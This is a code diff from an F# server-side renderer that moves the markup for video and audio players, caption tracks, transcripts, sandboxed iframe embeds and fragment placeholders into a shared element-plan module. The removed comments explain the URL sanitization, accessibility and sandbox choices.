-    // Phase 1076 — the media transport. Deterministic, script-free markup: a
-    // real `<video>` / `<audio>` a browser plays with no runtime, exactly as
-    // `Image` emits a real `<img>`.
-    //
-    // Four things here are contract rather than choice, and each is stated
-    // normatively in the wire spec because a host that got any of them wrong
-    // would still round-trip the bytes perfectly:
-    //
-    //   * `aria-label` ALWAYS. The label is mandatory on the wire and there is
-    //     no decorative case, so unlike `Image`'s `alt` there is no branch: the
-    //     attribute is emitted whatever the label resolves to. FUARAN108 is
-    //     what stops an empty one reaching here in the first place.
-    //   * `autoplay` NEVER WITHOUT `muted`. The pairing is not a default a
-    //     caller can override — it is what `Autoplay` means, which is why the
-    //     wire carries no separate `muted` slot to get out of step with it.
-    //     Every browser blocks unmuted autoplay anyway, so an unmuted emission
-    //     would produce a player that silently does not start: the declaration
-    //     would be a lie and the failure would be invisible.
-    //   * NO AUTOPLAY PATHWAY ON AUDIO, at all. Not "off by default" — the
-    //     `MediaKind.Audio` case carries no slot to read, so this arm has
-    //     nothing to branch on and cannot acquire one by a later edit here.
-    //   * BOTH URLS THROUGH THE EGRESS FLOOR. `Src` and `Poster` are each
-    //     fetched by the browser with no user act, which is the whole of the
-    //     `Media` egress class. They differ in what a REFUSAL means: an element
-    //     must have a source, so `src` collapses to the refusal URL and carries
-    //     the marker, while a poster simply leaves — a `<video>` with no poster
-    //     shows its first frame, which is a working rendering, whereas a poster
-    //     pointing at the refusal URL is a broken image painted over the
-    //     player. Same rule as a refused `SrcSet` candidate, same reason.
-    //
-    // The boolean attributes use Feliz's TYPED props rather than
-    // `prop.custom (name, "")`, and that is deliberate on this kind alone: the
-    // muted pairing has to hold in the DOM on BOTH tiers, and the typed props
-    // are the one spelling each backend renders correctly without a per-arm
-    // string (`autoPlay` → `autoplay` here, → React's `autoPlay` on the client).
+        Emit.plan (ElementPlan.MediaPlan.image (planContext walk ctx parentNodeId) spec semanticAttrs)
     | NodeKind.Media spec ->
-        let resolvedSrc =
-            BindingResolver.tryResolve ctx.Sources spec.Src |> Option.defaultValue ""
-
-        let safeSrc, egressAttrs =
-            Sanitize.sanitizeUrlForEgress ctx.Policy.Egress Sanitize.EgressClass.Media resolvedSrc
-
-        // Phase 1110 - the timed-text tracks. Three obligations live in this one
-        // fold, and each of them is something the bytes cannot carry:
-        //
-        //   * AUTHORED ORDER. The list is emitted exactly as the wire carries
-        //     it. This is the OPPOSITE of `srcSet`, which the renderers sort
-        //     ascending by width, and the difference is not an inconsistency: a
-        //     browser picks ONE candidate from a srcset by an algorithm, while a
-        //     reader picks a track from a menu the user agent builds in document
-        //     order. Sorting the first is canonicalisation; sorting the second
-        //     would be reordering someone else's menu.
-        //   * ONE DEFAULT PER KIND, FIRST WINS. A document electing two default
-        //     captions tracks is legal bytes - the decoder does not refuse it,
-        //     because a lenient host would render it anyway - and HTML leaves
-        //     two defaults of one kind undefined. So the host decides, and every
-        //     host decides the same way: the first election of a kind is
-        //     honoured and a later one emits WITHOUT the attribute. The track is
-        //     still emitted; only its claim on the menu is dropped.
-        //   * A REFUSED SOURCE DROPS THE TRACK. The poster rule rather than the
-        //     source rule: an element must have a source, but it need not have
-        //     this track, and a `<track>` pointing at the refusal URL is a menu
-        //     entry that opens onto nothing.
-        let trackKindToken (k: TrackKind) =
-            match k with
-            | TrackKind.Subtitles -> "subtitles"
-            | TrackKind.Captions -> "captions"
-            | TrackKind.Descriptions -> "descriptions"
-            | TrackKind.Chapters -> "chapters"
-
-        let trackEls =
-            spec.Tracks
-            |> List.fold
-                (fun (claimed: Set<string>, acc) (t: TrackEntry) ->
-                    let resolved =
-                        BindingResolver.tryResolve ctx.Sources t.Src |> Option.defaultValue ""
-
-                    let safe, refusal =
-                        Sanitize.sanitizeUrlForEgress ctx.Policy.Egress Sanitize.EgressClass.Media resolved
-
-                    if safe = "" || not (List.isEmpty refusal) then
-                        claimed, acc
-                    else
-                        let token = trackKindToken t.Kind
-                        let takesDefault = t.Default && not (Set.contains token claimed)
-
-                        let el =
-                            Html.track (
-                                [ prop.custom ("kind", token)
-                                  prop.src safe
-                                  prop.custom ("srclang", t.SrcLang)
-                                  prop.custom ("label", renderText ctx t.Label) ]
-                                @ (if takesDefault then [ prop.custom ("default", "") ] else [])
-                            )
-
-                        (if takesDefault then Set.add token claimed else claimed), el :: acc)
-                (Set.empty, [])
-            |> snd
-            |> List.rev
-
-        let trackChildren =
-            if List.isEmpty trackEls then
-                []
-            else
-                [ prop.children trackEls ]
-
-        // Phase 1110 - the transcript, rendered BESIDE the transport rather than
-        // inside it. `<video>` and `<audio>` admit only source-ish children, so
-        // a transcript in there would be fallback content a browser never shows;
-        // the disclosure has to be a sibling, which is why a present transcript
-        // is the one case that wraps. Absent, the emission is the bare element
-        // it always was - the `Image` caption treatment, for the same reason.
-        //
-        // The `<details>` carries the MEDIA's resolved label as its accessible
-        // name, so a reader meeting the disclosure out of context is told which
-        // recording it transcribes. The summary text is renderer chrome (the
-        // `Toast` dismiss precedent); the transcript itself is the document's.
-        let withTranscript (el: ReactElement) =
-            match spec.Transcript with
-            | None -> el
-            | Some transcript ->
-                Html.div
-                    [ prop.className Css.Class.MediaGroup
-                      prop.children
-                          [ el
-                            Html.details
-                                [ prop.className Css.Class.MediaTranscript
-                                  prop.custom ("aria-label", renderText ctx spec.Label)
-                                  prop.children
-                                      [ Html.summary
-                                            [ prop.className Css.Class.MediaTranscriptSummary; prop.text "Transcript" ]
-                                        Html.div
-                                            [ prop.className Css.Class.MediaTranscriptBody
-                                              prop.text (renderText ctx transcript) ] ] ] ] ]
-
-        let sharedProps (variantClass: string) =
-            [ prop.className (Css.media variantClass)
-              prop.src safeSrc
-              prop.custom ("aria-label", renderText ctx spec.Label) ]
-            @ (if spec.Controls then [ prop.controls true ] else [])
-            @ (if spec.Loop then [ prop.loop true ] else [])
-
-        match spec.Kind with
-        | MediaKind.Video(autoplay, poster) ->
-            let posterProps =
-                match poster with
-                | None -> []
-                | Some p ->
-                    let resolved = BindingResolver.tryResolve ctx.Sources p |> Option.defaultValue ""
-
-                    // The refusal is read from the seam's own marker list, not
-                    // by comparing against whatever URL it substitutes — the
-                    // `SrcSet` candidate rule, applied to the one other URL
-                    // this vocabulary fetches unprompted.
-                    let safe, refusal =
-                        Sanitize.sanitizeUrlForEgress ctx.Policy.Egress Sanitize.EgressClass.Media resolved
-
-                    if safe = "" || not (List.isEmpty refusal) then
-                        []
-                    else
-                        [ prop.poster safe ]
-
-            let autoplayProps =
-                if autoplay then
-                    [ prop.autoPlay true; prop.muted true ]
-                else
-                    []
-
-            withTranscript (
-                Html.video (
-                    sharedProps Css.Class.MediaVideo
-                    @ posterProps
-                    @ autoplayProps
-                    @ Emit.attrs semanticAttrs
-                    @ Emit.attrs egressAttrs
-                    @ trackChildren
-                )
-            )
-        | MediaKind.Audio ->
-            withTranscript (
-                Html.audio (
-                    sharedProps Css.Class.MediaAudio
-                    @ Emit.attrs semanticAttrs
-                    @ Emit.attrs egressAttrs
-                    @ trackChildren
-                )
-            )
+        Emit.plan (ElementPlan.MediaPlan.media (planContext walk ctx parentNodeId) spec semanticAttrs)
     | NodeKind.Embed spec ->
-        // Phase 1111 — the sandboxed third-party embed. Four obligations live
-        // here, and every one of them is something the bytes cannot carry.
-        //
-        //   * SANDBOX BY DEFAULT. The `sandbox` attribute is emitted ALWAYS,
-        //     and with no permissions it is emitted EMPTY, which is the
-        //     maximally-restrictive value. Omitting it on a permissionless
-        //     embed would be the same markup as an unsandboxed frame, so the
-        //     attribute is unconditional rather than derived from the list
-        //     being non-empty.
-        //   * DECLARATION ORDER, DE-DUPLICATED. The wire preserves whatever
-        //     order the document authored (the `tracks` rule, not `srcSet`'s —
-        //     no re-sorting of a document's own list), so the DETERMINISM the
-        //     SSR output needs is established here instead: the tokens are
-        //     emitted in the enum's declaration order and each at most once, so
-        //     two documents naming the same set produce byte-identical markup.
-        //   * FULLSCREEN IS NOT A SANDBOX TOKEN. It is a permissions-policy
-        //     directive and rides the `allow` attribute, which is emitted only
-        //     when it was declared — an empty `allow` is not the same statement
-        //     as an absent one.
-        //   * A REFUSED SOURCE DROPS THE ATTRIBUTE ENTIRELY. Not the refusal
-        //     URL that `Link` and `Image` substitute: an `<iframe>` pointed at
-        //     `about:blank#…` renders that page, where a frame with no `src` is
-        //     a well-defined empty frame that fetches nothing. The marker
-        //     attribute still records the refusal, so the two facts stay apart.
-        let resolvedSrc =
-            BindingResolver.tryResolve ctx.Sources spec.Src |> Option.defaultValue ""
-
-        let safeSrc, egressAttrs =
-            Sanitize.sanitizeEmbedSrcForEgress ctx.Policy.Egress resolvedSrc
-
-        let aspectClass = Css.embedAspect spec.AspectRatio
-
-        let has p = List.contains p spec.Permissions
-
-        let sandboxTokens =
-            [ if has EmbedPermission.AllowScripts then
-                  "allow-scripts"
-              if has EmbedPermission.AllowSameOrigin then
-                  "allow-same-origin"
-              if has EmbedPermission.AllowForms then
-                  "allow-forms" ]
-
-        Html.iframe (
-            [ prop.className (Css.Class.Embed + aspectClass)
-              prop.title (renderText ctx spec.Title)
-              prop.custom ("sandbox", String.concat " " sandboxTokens)
-              // Always lazy, and there is deliberately no slot to say otherwise:
-              // a third-party document is the one subresource whose fetch is
-              // never worth doing before the reader has scrolled to it.
-              prop.custom ("loading", "lazy")
-              // Conservative, but NOT `no-referrer`: several ubiquitous embed
-              // providers restrict playback by referring domain, so stripping
-              // the header outright breaks a legitimate embed. Sending the
-              // origin and nothing else satisfies them while leaking no path
-              // and no query.
-              prop.custom ("referrerpolicy", "strict-origin-when-cross-origin") ]
-            @ (match safeSrc with
-               | Some s -> [ prop.src s ]
-               | None -> [])
-            @ (if has EmbedPermission.AllowFullscreen then
-                   [ prop.custom ("allow", "fullscreen") ]
-               else
-                   [])
-            @ Emit.attrs semanticAttrs
-            @ Emit.attrs egressAttrs
-        )
-    // Phase 1120 — the `Tree` SSR floor, and it is NORMATIVE (docs/SSR.md): a
-    // server rendering of a tree is nested lists carrying the full ARIA tree
-    // vocabulary, with `aria-expanded` reflecting the statically-resolvable
-    // expanded state and exactly one row carrying `tabindex="0"`. There is NO
-    // SCRIPT at any point, so the floor is what a reader with JavaScript off,
-    // or a client that has not hydrated yet, actually gets: a complete,
-    // navigable, correctly-announced hierarchy that simply does not toggle.
-    //
-    // Every structural decision here is shared with the client leg through
-    // `BindingResolver`, so the two cannot come apart: which rows are open,
-    // which row is focusable, and what "visible" means are all computed there.
+        Emit.plan (ElementPlan.MediaPlan.embed (planContext walk ctx parentNodeId) spec semanticAttrs)
     | NodeKind.Tree spec ->
         let expandedKeyNamed = spec.ExpandedStateKey.IsSome
         let expanded = BindingResolver.readExpandedItems ctx.Sources spec.ExpandedStateKey
@@ -1739,10 +850,7 @@ and private renderKind
         let raw = spec.Name
 
         if Set.contains raw walk.Expanding then
-            Html.div
-                [ prop.className Css.Class.FragmentCyclePlaceholder
-                  prop.custom ("data-fuaran-fragment-cycle", raw)
-                  prop.text (RenderParity.fragmentCycleText raw) ]
+            Emit.plan (ElementPlan.StructuralPlan.fragmentCycle raw)
         else
             match Map.tryFind raw ctx.Fragments with
             | Some body ->
@@ -1754,11 +862,7 @@ and private renderKind
                         Expanding = Set.add raw walk.Expanding }
                     ctx
                     namespaced
-            | None ->
-                Html.div
-                    [ prop.className Css.Class.FragmentUnresolvedPlaceholder
-                      prop.custom ("data-fuaran-fragment-unresolved", raw)
-                      prop.text (sprintf "[fuaran:fragment unresolved '%s']" raw) ]
+            | None -> Emit.plan (ElementPlan.StructuralPlan.fragmentUnresolved raw)
     | NodeKind.Custom spec ->
         renderCustom
             ctx
@@ -1773,15 +877,27 @@ and private renderKind
         // as the client renderer, so server and client emit byte-identical
         // structure across the boundary (no hydration mismatch); the guest
         // loader attaches client-side (Phase 266).
-        Html.div
-            [ prop.className Css.Class.MountBoundary
-              prop.custom ("data-fuaran-mount-scope", spec.ScopeId)
-              prop.children
-                  [ Html.div
-                        [ prop.className Css.Class.MountPlaceholder
-                          prop.text (sprintf "[fuaran:mount '%s' — guest loader not attached]" spec.ScopeId) ] ] ]
+        Emit.plan (
+            ElementPlan.StructuralPlan.mountBoundary
+                spec.ScopeId
+                (ElementPlan.StructuralPlan.mountPlaceholder spec.ScopeId)
+        )
 
 // ─── Custom escape hatch (Phase 141 — server registry seam) ─────────────────
+
+/// What a container kind's plan needs from this renderer (Phase 2278): the
+/// style collector, and a child rendered one walk level down.
+and private planContext
+    (walk: Walk)
+    (ctx: ServerRenderContext)
+    (nodeId: string)
+    : ElementPlan.PlanContext<obj, ReactElement> =
+    { Sources = ctx.Sources
+      Csp = ctx.Policy.Csp
+      Collector = Some ctx.Styles
+      Egress = ctx.Policy.Egress
+      NodeId = nodeId
+      Child = fun child -> ElementPlan.Plan.Host(renderNode (Walk.deeper walk) ctx child) }
 
 and private renderCustom
     (ctx: ServerRenderContext)
